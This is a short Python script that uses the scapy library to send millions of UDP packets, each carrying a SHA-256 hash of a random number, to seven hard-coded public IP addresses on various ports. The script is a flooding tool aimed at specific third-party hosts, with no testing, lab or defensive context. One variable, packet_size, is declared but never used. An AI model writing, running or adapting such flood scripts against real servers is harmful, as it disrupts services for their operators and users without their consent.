from scapy.all import *
import hashlib
import time
import random
message = random.randint(1, 3456000)
hash_content = hashlib.sha256(str(message).encode()).hexdigest() 

servers = [
    ("195.110.38.219", 53),
    ("194.204.23.188", 115),
    ("94.182.181.242", 56),
    ("79.175.172.30", 1070),
    ("104.26.14.148", 123),
    ("185.147.161.203", 63),
    ("185.193.47.26", 47)
]
packet_count = 3456000 
packet_size = 25600  

for server in servers:
    for _ in range(packet_count):
        packet = IP(dst=server[0])/UDP(dport=server[1])/Raw(load=hash_content)
        send(packet, verbose=0)
        time.sleep(0.025)
